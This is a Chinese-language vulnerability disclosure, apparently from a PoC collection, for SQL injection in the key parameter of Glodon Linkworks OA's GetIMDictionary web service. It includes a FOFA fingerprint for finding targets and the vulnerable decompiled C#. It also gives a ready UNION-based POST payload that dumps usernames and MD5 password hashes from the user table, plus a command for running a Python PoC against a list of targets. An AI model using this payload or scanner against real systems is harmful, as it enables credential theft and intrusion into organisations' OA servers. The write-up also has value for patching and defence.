# 广联达Linkworks办公OA GetIMDictionary SQL注入

## 漏洞描述

广联达Linkworks办公OA /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary接口key参数存在SQL注入

## 漏洞影响

```
广联达 Linkworks
```

## FOFA

```
fid="/yV4r5PdARKT4jaqLjJYqw=="
```

## 漏洞复现

登陆页面

![image-20230815141857159](img/image-20230815141857159.png)

后台验证代码

```
// GTP.IM.Services.Config.WebSite.WebService.IM.Config.ConfigService
// Token: 0x06000018 RID: 24 RVA: 0x00004148 File Offset: 0x00002348
[WebMethod(Description = "得到IM系统配置")]
public string GetIMDictionary(string key)
{
	string str = string.Empty;
	ISysConfigService service = ServiceFactory.GetService<ISysConfigService>();
	StringBuilder stringBuilder = new StringBuilder();
	stringBuilder.AppendFormat("select F_VALUE from T_IM_DICTIONARY where f_key='{0}';", key);
	DataSet dataSet = GSqlDataAccess.SelectDataSet(service.DataSourceName, stringBuilder.ToString(), new DataParameter[0]);
	if (dataSet != null && dataSet.Tables.Count > 0 && dataSet.Tables[0] != null)
	{
		foreach (object obj in dataSet.Tables[0].Rows)
		{
			DataRow dataRow = (DataRow)obj;
			str = dataRow["F_VALUE"].ToString();
		}
	}
	StringBuilder stringBuilder2 = new StringBuilder();
	stringBuilder2.Append("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
	stringBuilder2.Append("<result  value=\"" + str + "\" >");
	stringBuilder2.Append("</result>");
	return stringBuilder2.ToString();
}
```

验证POC POST key参数注入即可

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```

得到username和密码

![image-20230815142135624](img/image-20230815142135624.png)

## Python poc

```
python "广联达OA  GetIMDictionary SQL注入.py" -t 广联达OAsql.txt
```

![image-20230815143848992](img/image-20230815143848992.png)